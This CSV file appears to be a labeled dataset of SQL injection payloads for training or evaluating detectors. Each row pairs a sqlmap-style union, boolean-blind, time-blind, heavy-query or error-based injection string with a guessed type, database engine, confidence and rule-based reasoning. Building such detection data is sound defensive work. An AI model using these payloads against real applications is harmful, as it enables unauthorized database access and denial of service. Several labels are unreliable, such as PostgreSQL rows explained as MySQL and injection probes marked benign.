id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
20167,-8095' ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ),boolean_blind,generic,0.65,Pattern '\bcase\s+when' matched; type=boolean_blind,0
20168,1 ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( 6824 = 6824,time_blind,mysql,0.75,'sleep()' time-delay function matched; MySQL time-based blind SQLi confirmed,1
20169,"1' ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 'ekla' = 'ekla",heavy_query,generic,0.65,Heuristic analysis: heavy_query inferred from structure,0
20170,"1' ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'zspf' = 'zspf",time_blind,sqlite,0.75,Pattern '\brandomblob\s*\(' matched; type=time_blind,1
20171,"-2222' in boolean mode ) union all select 7649,7649,7649,7649,7649,7649,7649,7649--",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20172,"-3525"" where 3522 = 3522 union all select 3522,3522,3522,3522,3522,3522,3522,3522,3522#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20173,"1' ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20174,-7746' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'itxy' like 'itxy,boolean_blind,generic,0.75,Pattern '\bcase\s+when' matched; type=boolean_blind,1
20175,"1 ) ) as nnpe where 9720 = 9720 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20176,1 where 6523 = 6523 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.75,'sleep()' time-delay function matched; MySQL time-based blind SQLi confirmed,1
20177,select case when 2930 = 7964 then 1 else null end--,boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20178,"1"" where 7631 = 7631 and 4733 = 3439",boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20179,1 ) as crsd where 5271 = 5271 waitfor delay '0:0:5'--,time_blind,mssql,0.9,'WAITFOR DELAY' MSSQL time function; time-blind SQLi,2
20180,1%' ) ) ) rlike sleep ( 5 ) and ( ( ( '%' = ',time_blind,mysql,0.75,'sleep()' time-delay function matched; MySQL time-based blind SQLi confirmed,1
20181,select case when 6555 = 7349 then 1 else null end--,boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20182,"1 where 4448 = 4448 union all select null,null,null,null,null#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20183,1'|| ( select 'hafu' where 6226 = 6226,boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20184,1'+ ( select mfcd where 6757 = 6757 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) +',boolean_blind,generic,0.65,Pattern '\bcase\s+when' matched; type=boolean_blind,0
20185,1' ) where 2852 = 2852,boolean_blind,generic,0.75,Heuristic analysis: boolean_blind inferred from structure,1
20186,"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) )",time_blind,mysql,0.75,"'benchmark(N, function)' causes CPU delay; MySQL time-blind confirmed",1
20187,select ( case when ( 1898 = 4705 ) then 1898 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20188,1 ) ) as svhd where 9761 = 9761,boolean_blind,generic,0.75,Heuristic analysis: boolean_blind inferred from structure,1
20189,"-1868 ) ) union all select 1859,1859--",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20190,"1 ) ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20191,"1"" ) rlike ( select ( case when ( 8732 = 6244 ) then 1 else 0x28 end ) ) and ( ""unuk"" = ""unuk",boolean_blind,mysql,0.9,'RLIKE' regex operator; MySQL boolean context.....,2
20192,"1"" ) ) or sleep ( 5 ) and ( ( ""mcyv"" = ""mcyv",time_blind,mysql,0.75,'sleep()' time-delay function matched; MySQL time-based blind SQLi confirmed,1
20193,1'|| ( select 'agng' from dual where 3337 = 3337 rlike sleep ( 5 ) ) ||',time_blind,mysql,0.75,'sleep()' time-delay function matched; MySQL time-based blind SQLi confirmed,1
20194,"-3270"" where 2144 = 2144 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20195,-9700' ) or 8811 = 7862,boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20196,"1 ) as wbcd where 9506 = 9506 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20197,"1' ) as bagi where 1281 = 1281 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",boolean_blind,generic,0.75,Pattern '\bcase\s+when' matched; type=boolean_blind,1
20198,1 ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 7594 = 7594,boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20199,"1"" ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( ""rsru"" = ""rsru",time_blind,postgresql,0.75,'sleep()' time-delay function matched; MySQL time-based blind SQLi confirmed,1
20200,"1"" and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.75,"'benchmark(N, function)' causes CPU delay; MySQL time-blind confirmed",1
20201,"1' where 9961 = 9961 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20202,1' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'yvxg' = 'yvxg,boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20203,1%' and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and '%' = ',time_blind,postgresql,0.75,'sleep()' time-delay function matched; MySQL time-based blind SQLi confirmed,1
20204,"-3420 where 9681 = 9681 or make_set ( 2438 = 1977,1977 ) --",boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20205,1' ) ) as vrwr where 3830 = 3830,boolean_blind,generic,0.75,Heuristic analysis: boolean_blind inferred from structure,1
20206,"1"" ) where 1833 = 1833",boolean_blind,generic,0.75,Heuristic analysis: boolean_blind inferred from structure,1
20207,"1'+ ( select aahc where 5436 = 5436 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) ) +'",time_blind,mysql,0.75,"'benchmark(N, function)' causes CPU delay; MySQL time-blind confirmed",1
20208,"1%"" ) and make_set ( 8403 = 8403,8899 ) and ( ""%"" = """,benign,generic,0.75,Heuristic analysis: benign inferred from structure,1
20209,"1' ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and 'uqyt' = 'uqyt",boolean_blind,generic,0.75,Pattern '\bcase\s+when' matched; type=boolean_blind,1
20210,"1'|| ( select 'adiv' from dual where 9842 = 9842 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||'",boolean_blind,generic,0.65,Pattern '\bcase\s+when' matched; type=boolean_blind,0
20211,"1 ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20212,"1"" and elt ( 1210 = 1210,sleep ( 5 ) )",boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20213,"1'+ ( select 'ewlk' where 1078 = 1078 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20214,"1%"" union all select null#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20215,"1"" ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ""qqky"" like ""qqky",time_blind,oracle,0.9,Pattern '\bdbms_pipe\.receive_message' matched; type=time_blind,2
20216,-7810 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) -- vuvj,boolean_blind,generic,0.65,Pattern '\bcase\s+when' matched; type=boolean_blind,0
20217,"1 ) as kzyb where 7023 = 7023 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.65,Heuristic analysis: heavy_query inferred from structure,0
20218,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( 'hube' = 'hube",heavy_query,generic,0.65,Heuristic analysis: heavy_query inferred from structure,0
20219,"-5150 ) ) ) union all select 5660,5660,5660#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20220,"1 ) ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20221,-9650' ) or 1390 = 3209,boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20222,-3582' ) or 6872 = 6872 and ( 'gyfj' = 'gyfj,boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20223,"1'|| ( select 'zbdv' where 1618 = 1618 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) ||'",boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20224,"1' ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 'bzak' like 'bzak",heavy_query,postgresql,0.9,Heuristic analysis: heavy_query inferred from structure,2
20225,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( '%' = '",boolean_blind,firebird,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20226,-4900' ) ) or 7208 = 3236,boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20227,1 ) ) as zldh where 3302 = 3302 rlike ( select ( case when ( 1481 = 5677 ) then 1 else 0x28 end ) ) --,boolean_blind,mysql,0.9,'RLIKE' regex operator; MySQL boolean context.....,2
20228,"1'+ ( select zpns where 6922 = 6922 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) +'",boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20229,1' ) as ulbr where 7233 = 7233 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20230,-5500' ) order by 1--,benign,generic,0.9,Heuristic analysis: benign inferred from structure,2
20231,"1'+ ( select 'mgrj' where 8514 = 8514 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) ) +'",boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20232,"-9988%"" or elt ( 1032 = 1032,3623 ) and ""%"" = """,boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20233,"1"" where 4161 = 4161 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.75,Pattern '\brandomblob\s*\(' matched; type=time_blind,1
20234,"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20235,1' and ( 3423 = 7789 ) *7789 and 'pdia' like 'pdia,benign,generic,0.75,Heuristic analysis: benign inferred from structure,1
20236,"iif ( 4436 = 8910,1,1/0 )",benign,generic,0.9,Heuristic analysis: benign inferred from structure,2
20237,"1'|| ( select 'kbvq' where 9279 = 9279 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) ) ||'",boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20238,select ( case when ( 3336 = 9781 ) then 3336 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20239,-1021 ) as erjh where 7845 = 7845 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20240,"1%' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and '%' = '",time_blind,mysql,0.75,"'benchmark(N, function)' causes CPU delay; MySQL time-blind confirmed",1
20241,-7034' ) ) ) union all select 4023#,union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20242,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( 'lijy' = 'lijy",time_blind,mysql,0.75,"'benchmark(N, function)' causes CPU delay; MySQL time-blind confirmed",1
20243,"1 ) as adzj where 5575 = 5575 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,Heuristic analysis: heavy_query inferred from structure,2
20244,"1%"" or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20245,select ( case when ( 8350 = 7872 ) then 8350 else 8350* ( select 8350 from information_schema.character_sets ) end ) #,boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20246,"-4287%"" ) ) union all select 9074,9074,9074,9074,9074,9074,9074,9074,9074,9074#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20247,1' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,0.75,'sleep()' time-delay function matched; MySQL time-based blind SQLi confirmed,1
20248,"1%"" ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20249,"1"" or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""ctdc"" = ""ctdc",boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20250,"1%"" and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20251,select ( case when ( 8362 = 7572 ) then 8362 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20252,"1"" where 2886 = 2886",boolean_blind,generic,0.75,Heuristic analysis: boolean_blind inferred from structure,1
20253,"1' where 6417 = 6417 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,postgresql,0.75,Heuristic analysis: heavy_query inferred from structure,1
20254,-8777%' ) ) ) or ( 3934 = 2025 ) *2025 and ( ( ( '%' = ',benign,generic,0.75,Heuristic analysis: benign inferred from structure,1
20255,"1%"" ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( ""%"" = """,time_blind,mysql,0.75,"'benchmark(N, function)' causes CPU delay; MySQL time-blind confirmed",1
20256,"1'+ ( select 'qzcx' where 9524 = 9524 and elt ( 3069 = 8430,8430 ) ) +'",boolean_blind,mysql,0.9,'ELT()' conditional function; MySQL boolean-blind context,2
20257,"1 ) where 8734 = 8734 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.75,'extractvalue()' XPath error extraction; MySQL error-based SQLi,1
20258,"1%"" ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( ""%"" = """,boolean_blind,mysql,0.9,'RLIKE' regex operator; MySQL boolean context.....,2
20259,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20260,"1%' union all select null,null#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20261,"1' and elt ( 1210 = 1210,sleep ( 5 ) ) and 'yhpp' like 'yhpp",boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20262,"1"" ) ) or sleep ( 5 ) #",time_blind,mysql,0.75,'sleep()' time-delay function matched; MySQL time-based blind SQLi confirmed,1
20263,"1' ) ) as pstn where 6691 = 6691 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20264,"1"" ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ""chvi"" like ""chvi",boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20265,-2181' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 'wyez' = 'wyez,boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20266,"1'|| ( select 'pzto' from dual where 7338 = 7338 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) ||'",boolean_blind,oracle,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20267,"1' ) ) as cgey where 2130 = 2130 and make_set ( 7914 = 4032,4032 ) --",boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20268,"-7078'|| ( select 'lcza' where 5076 = 5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20269,1'+ ( select 'iify' where 6257 = 6257 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ) +',time_blind,postgresql,0.75,'sleep()' time-delay function matched; MySQL time-based blind SQLi confirmed,1
20270,"-1975"" union all select 8638,8638,8638,8638,8638,8638,8638,8638,8638#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20271,"1'|| ( select 'kgfu' from dual where 2607 = 2607 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,oracle,0.9,Heuristic analysis: boolean_blind inferred from structure,2
